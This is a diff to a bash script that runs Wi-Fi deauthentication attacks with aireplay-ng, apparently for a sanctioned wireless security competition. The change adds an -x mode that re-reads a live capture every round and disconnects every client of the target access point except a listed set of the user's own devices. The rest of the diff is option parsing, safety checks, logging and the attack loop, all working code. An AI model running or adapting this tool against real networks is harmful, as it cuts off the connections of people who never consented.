@@ -10,9 +10,12 @@
 #   - the monitor interface reads back the channel given with -c
 #   - the run's own capture hears the BSSID within about 10 s
 #
-# Without -f, each round is one aireplay-ng call with no destination. That sends deauthentication to
-# the broadcast address, so every client of the AP is disconnected. With -f, each round is one call
+# Without -f or -x, each round is one aireplay-ng call with no destination. That sends deauthentication
+# to the broadcast address, so every client of the AP is disconnected. With -f, each round is one call
 # per client in the file (one MAC per line; # starts a comment). The AP and this card are never targets.
+# With -x, the clients come from the run's own capture, read again every round: every station that the
+# capture lists on the AP, except the MACs in the -x file, this card and the AP. Nothing is broadcast,
+# and a round with no other client is skipped.
 # The run folder holds deauth.log (every send), aireplay.txt (the raw output), capture-01.cap (the air
 # during the run) and capture-01-health.txt (the same table, printed at the end). Ctrl-C stops the run,
 # and WiFi is restored on exit. With -M, the monitor interface stays up for the run that owns it.
@@ -23,6 +26,7 @@
 #   ./scripts/competition-deauth.sh -b <BSSID> -c <CHANNEL> [-u <HH:MM>] --dry-run
 #   sudo ./scripts/competition-deauth.sh -i wlp2s0 -b <BSSID> -c <CHANNEL> [-u <HH:MM>] --in-window
 #   sudo ./scripts/competition-deauth.sh -M wlp2s0mon -b <BSSID> -c <CHANNEL> [-u <HH:MM>] --in-window
+#   sudo ./scripts/competition-deauth.sh -M wlp2s0mon -b <BSSID> -c <CHANNEL> -x logs/own-devices.txt --in-window
 #
 #   -i  Wi-Fi interface. The run starts monitor mode on it, and restores WiFi on exit
 #   -M  monitor interface that is already up, such as the one wep-crack.sh uses. The run neither
@@ -32,6 +36,8 @@
 #   -c  the network's channel
 #   -u  optional: HH:MM on this machine's clock: when the window closes. The run stops then.
 #   -f  optional: file of client MACs, one per line; # starts a comment. Without it, the broadcast address.
+#   -x  optional: file of your own MACs, one per line; # starts a comment. Targets every other client the
+#       run's capture lists on the AP, read again each round. Instead of -f. Nothing is broadcast
 #   -r  optional: stop after this many rounds (default: until -u, or Ctrl-C)
 #   --in-window  needed for a real run, and only while the official window is open
 #   --dry-run    print the plan and exit
@@ -69,15 +75,18 @@ MONIFACE=""
 BSSID=""
 CHANNEL=""
 CLIENTS=""
+OWNLIST=""
+LIVE=0
 ROUNDS=""
 UNTIL=""
-while getopts ":i:M:b:c:f:r:u:h" opt; do
+while getopts ":i:M:b:c:f:x:r:u:h" opt; do
   case "$opt" in
     i) IFACE="$OPTARG" ;;
     M) MONIFACE="$OPTARG" ;;
     b) BSSID="${OPTARG^^}" ;;
     c) CHANNEL="$OPTARG" ;;
     f) CLIENTS="$OPTARG" ;;
+    x) OWNLIST="$OPTARG" ;;
     r) ROUNDS="$OPTARG" ;;
     u) UNTIL="$OPTARG" ;;
     h) usage 0 ;;
@@ -88,6 +97,7 @@ done
 # Everything up to the START prompt runs without root and changes nothing.
 [[ -n "$BSSID" && -n "$CHANNEL" ]] || usage
 [[ -z "$IFACE" || -z "$MONIFACE" ]] || die "Give -i or -M, not both: -i starts monitor mode here, -M uses one that is up."
+[[ -z "$CLIENTS" || -z "$OWNLIST" ]] || die "Give -f or -x, not both: -f is a fixed list, -x takes the clients live from this run's capture."
 (( DRY_RUN )) || [[ -n "$IFACE$MONIFACE" ]] || usage
 (( DRY_RUN || IN_WINDOW )) || die "Refusing to run. Pass --in-window, and only while the official evaluation window is open."
 [[ "$BSSID" =~ ^([0-9A-F]{2}:){5}[0-9A-F]{2}$ ]] || die "-b must be a BSSID such as 11:22:33:44:55:66"
@@ -120,6 +130,16 @@ if [[ -n "$CLIENTS" ]]; then
   done
   (( ${#TARGETS[@]} > 0 )) || die "No clients left to deauthenticate after the checks."
 fi
+if [[ -n "$OWNLIST" ]]; then
+  # The -x list keeps your own devices out, so every line has to be read: a line that is not read could
+  # be one of your devices. Nothing is sent unless the whole list parses.
+  [[ -r "$OWNLIST" ]] || die "Cannot read $OWNLIST"
+  BAD_LINES=$(bad_mac_lines "$OWNLIST")
+  [[ -z "$BAD_LINES" ]] || die "These lines in $OWNLIST are not MAC addresses, so nothing was sent: $(paste -sd';' <<< "$BAD_LINES")"
+  OWN_MAC_COUNT=$(mac_list "$OWNLIST" | wc -l)
+  (( OWN_MAC_COUNT > 0 )) || die "$OWNLIST lists no MAC addresses, so nothing would be left out. Add your own devices, or leave -x out. Nothing was sent."
+  LIVE=1
+fi
 
 LIMIT_TEXT="until Ctrl-C"
 [[ -n "$UNTIL" ]] && LIMIT_TEXT="until $UNTIL"
@@ -127,7 +147,12 @@ if [[ -n "$ROUNDS" ]]; then
   LIMIT_TEXT="$ROUNDS round(s)"
   [[ -n "$UNTIL" ]] && LIMIT_TEXT="$LIMIT_TEXT, or until $UNTIL, whichever comes first"
 fi
-if [[ "${TARGETS[0]}" == broadcast ]]; then
+if (( LIVE )); then
+  echo "[*] BSSID $BSSID on channel $CHANNEL: every other client that the run's own capture lists on the AP, read again each round, $FRAMES frames to each a round, $LIMIT_TEXT."
+  echo "[*] Left out of every round, never sent to: the $OWN_MAC_COUNT MAC(s) in $OWNLIST, this card and the AP:"
+  mac_list "$OWNLIST" | sed 's/^/    /'
+  echo "[*] One round is one call per client: aireplay-ng --deauth $FRAMES -a $BSSID -c <client> <monitor>"
+elif [[ "${TARGETS[0]}" == broadcast ]]; then
   echo "[*] BSSID $BSSID on channel $CHANNEL: broadcast deauthentication (every client of the AP), $FRAMES frames a round, $LIMIT_TEXT."
   echo "[*] One round is one call: aireplay-ng --deauth $FRAMES -a $BSSID <monitor>"
 else
@@ -185,7 +210,11 @@ else
 fi
 {
   echo "# BSSID $BSSID  channel $CHANNEL  frames $FRAMES  pause ${PAUSE}s  call limit ${CALL_LIMIT}s  rounds ${ROUNDS:-no limit}  until ${UNTIL:-Ctrl-C}  start $(date +%F_%T)"
-  echo "# targets: ${TARGETS[*]}"
+  if (( LIVE )); then
+    echo "# targets: every other client the run's capture lists on the AP, except the MACs in $OWNLIST"
+  else
+    echo "# targets: ${TARGETS[*]}"
+  fi
 } | tee "$LOG"
 
 # With -M, the channel is checked before the run's own capture starts: its airodump-ng -c would
@@ -218,11 +247,29 @@ if (( ! heard )); then
 fi
 echo "[*] The run's capture hears $BSSID." | tee -a "$LOG"
 
+if (( LIVE )); then
+  # The addresses that no round sends to: the -x list, the AP, and this card (its monitor address,
+  # which a crack's fake station also uses). The list is kept with the run's logs.
+  OWN=$(cat "/sys/class/net/$MON/address" 2>/dev/null | tr 'a-f' 'A-F')
+  EXCL="$RUNDIR/excluded.txt"
+  { mac_list "$OWNLIST"; echo "$BSSID"; [[ -n "$OWN" ]] && echo "$OWN"; } > "$EXCL"
+  echo "[*] $(wc -l < "$EXCL") address(es) are left out of every round, listed in $EXCL." | tee -a "$LOG"
+fi
+
 stopped_at_until=0
 failed=0
 round=1
 while [[ -z "$ROUNDS" ]] || (( round <= ROUNDS )); do
-  for tgt in "${TARGETS[@]}"; do
+  if (( LIVE )); then
+    # Read again every round, so a client that joined since the last round is included.
+    mapfile -t TARGETS < <(live_targets "$RUNDIR/capture-01.csv" "$BSSID" "$EXCL")
+    if (( ${#TARGETS[@]} > 0 )); then
+      echo "$(date +%T) round $round: ${#TARGETS[@]} other client(s): ${TARGETS[*]}" | tee -a "$LOG"
+    else
+      echo "$(date +%T) round $round: no other client of $BSSID in the capture yet" | tee -a "$LOG"
+    fi
+  fi
+  for tgt in ${TARGETS[@]+"${TARGETS[@]}"}; do
     if [[ -n "$UNTIL" ]] && (( $(date +%s) >= UNTIL_EPOCH )); then
       echo "$(date +%T) window end $UNTIL reached: stopping" | tee -a "$LOG"
       stopped_at_until=1
